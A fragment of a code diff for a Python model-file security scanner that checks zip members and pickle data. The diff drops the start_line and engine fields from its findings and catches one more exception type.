             file_path=str(file_path),
-            start_line=0,
             confidence=0.6,
             cwe_ids=[22],
-            engine="mfv",
             metadata={"problems": problems[:20]},
         )]
 
@@ -5562,7 +3443,7 @@ class ModelFileScanner:
                             continue
                         try:
                             member_data = self._read_zip_member_capped(zf, name, self.MAX_ZIP_MEMBER_BYTES)
-                        except (OSError, zipfile.BadZipFile, RuntimeError):
+                        except (OSError, zipfile.BadZipFile, RuntimeError, ValueError):
                             continue
                         if member_data is None:
                             continue
@@ -5578,9 +3459,7 @@ class ModelFileScanner:
                     severity=Severity.LOW,
                     category=Category.AI_ML,
                     file_path=str(file_path),
-                    start_line=0,
                     confidence=0.50,
-                    engine="mfv",
                     metadata={"skipped_reason": "zip_walk_failed", "error": type(exc).__name__},
                 ))
             return findings
@@ -5676,9 +3555,7 @@ class ModelFileScanner:
                         severity=Severity.HIGH,
                         category=Category.AI_ML,
                         file_path=str(file_path),
-                        start_line=0,
                         confidence=0.6,
-                        engine="mfv",
                         metadata={"skipped_reason": "oversized_decompressed"},
                     )]
                 return self._scan_pickle(file_path, decompressed)
